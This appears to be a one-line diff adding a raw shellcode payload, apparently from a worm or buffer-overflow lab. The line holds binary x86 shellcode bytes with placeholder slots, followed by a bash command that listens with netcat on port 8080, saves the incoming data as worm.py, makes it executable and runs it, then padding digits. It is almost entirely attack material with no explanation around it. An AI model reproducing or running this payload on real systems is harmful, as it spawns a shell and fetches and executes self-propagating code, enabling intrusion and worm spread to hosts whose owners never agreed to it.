@@ -1,0 +1,1 @@
+<Öÿÿë,Y1ÀˆAˆA1Ò²ÐˆY‰A‰AA‰A1À‰A1Ò°Í€èÏÿÿÿAAAABBBBCCCCDDDD/bin/bash*-c* echo '(^_^) Shellcode is running (^_^)';                   nc -lnv 8080 > worm.py;                                     chmod a+x worm.py; ./worm.py                               *123456789012345678901234567890123456789012345678901234567890
